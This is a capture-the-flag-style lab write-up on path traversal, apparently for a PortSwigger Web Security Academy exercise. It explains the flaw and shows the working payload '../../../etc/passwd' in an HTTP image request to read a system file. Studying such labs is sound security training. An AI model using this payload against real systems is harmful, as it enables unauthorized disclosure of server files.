# Path Traversal — File path traversal, simple case


**Difficulty:** Apprentice

**Status:** ✅ Solved



## Overview



This lab contains a **Path Traversal** vulnerability in the functionality that displays product images.



The goal is to retrieve the contents of:



```text

/etc/passwd

```



## What is Path Traversal?



**Path Traversal**, also known as **Directory Traversal**, is a vulnerability that occurs when an application uses 

user-controlled input to construct a file path without properly validating it.



An attacker can use traversal sequences such as:



```text

../

```



to move to the parent directory and access files outside the intended directory.



---



## Initial Request



When loading a product image, the application sends a request similar to:



```http

GET /image?filename=61.jpg HTTP/2


```



The important parameter is:




```text

filename=61.jpg

```



The application uses this value to determine which file to read.



---



## Exploitation



The application does not properly prevent directory traversal sequences.



We can therefore replace the filename with:


```text

../../../etc/passwd

```



The resulting request is:



```http

GET /image?filename=../../../etc/passwd HTTP/2

```



### How it works



Each:



```text

../

```



moves one directory up.


Conceptually:



```text

images/

   ↓ ../

parent/

   ↓ ../

parent/

   ↓ ../

/

   ↓

etc/passwd

```



The application eventually accesses:



```text

/etc/passwd

```



and returns its contents.



---



## Key Concept


The important point is not memorizing the exact payload.



The key idea is understanding that:



```text

../

```



represents the **parent directory**, allowing an attacker to move outside the intended directory when the application 
does not properly validate the file path.



### Attack Flow



```text

User-controlled filename

        ↓

     ../../../

        ↓

Escape the intended directory
        ↓

Access an unintended file

        ↓

/etc/passwd

```



## Key Takeaways



* Path Traversal can allow access to files outside the intended directory.

* `../` is the main traversal sequence.

* The vulnerability occurs when user-controlled file paths are not properly validated.

* Always identify which parameter controls the file path.

* Do not rely only on memorizing payloads; understand how the filesystem resolves paths.

## Lab Payload



```text

../../../etc/passwd

```


**Result:** Retrieved `/etc/passwd` and solved the lab. ✅


## References


* PortSwigger Web Security Academy — Path Traversal
  https://portswigger.net/web-security/file-path-traversal



* OWASP — Path Traversal
  https://owasp.org/www-community/attacks/Path_Traversal
